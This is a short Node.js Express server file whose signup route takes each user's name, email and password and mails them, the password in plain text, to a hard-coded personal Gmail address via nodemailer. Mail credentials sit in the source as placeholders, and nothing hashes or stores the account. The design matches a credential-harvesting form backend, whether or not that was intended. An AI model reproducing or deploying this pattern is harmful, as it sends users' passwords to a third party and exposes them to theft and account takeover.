const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));

// Serve the static HTML file
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

// Sign Up POST route
app.post('/signup', (req, res) => {
    const { name, email, password } = req.body;

    // Create a transporter
    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'yourgmail@gmail.com',  // Your Gmail address
            pass: 'yourpassword'         // Your Gmail password or App Password
        }
    });

    const mailOptions = {
        from: '',
        to: 'mdrashedulkabir555@gmail.com',
        subject: 'New User Signup',
        text: `Name: ${name}\nEmail: ${email}\nPassword: ${password}`
    };

    // Send email
    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.log(error);
            res.status(500).send('Error sending email');
        } else {
            console.log('Email sent: ' + info.response);
            res.send('Sign up successful! Email notification sent.');
        }
    });
});

// Start the server
app.listen(3000, () => {
    console.log('Server is running on http://localhost:3000');
});
